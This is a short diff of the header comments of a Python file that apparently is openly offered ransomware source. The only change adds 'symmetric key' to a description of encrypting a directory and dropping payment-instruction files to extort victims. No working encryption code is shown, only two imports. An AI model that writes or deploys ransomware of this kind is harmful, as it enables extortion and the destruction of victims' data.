@@ -1,5 +1,5 @@
                                                        #Copyright (C) 2024 privateboss01
-#This ransomware encrypts the files and child folder of a directory with a password and drops a payment_instruction text files which can be found by searching for "payment_instructions"
+#This symmetric key ransomware encrypts the files and child folder of a directory with a password and drops a payment_instruction text files which can be found by searching for "payment_instructions"
 #Once the payment has been recieved, the attacker sends the password to the victim to release the encrypted files and folders.
 import pathlib
 import secrets
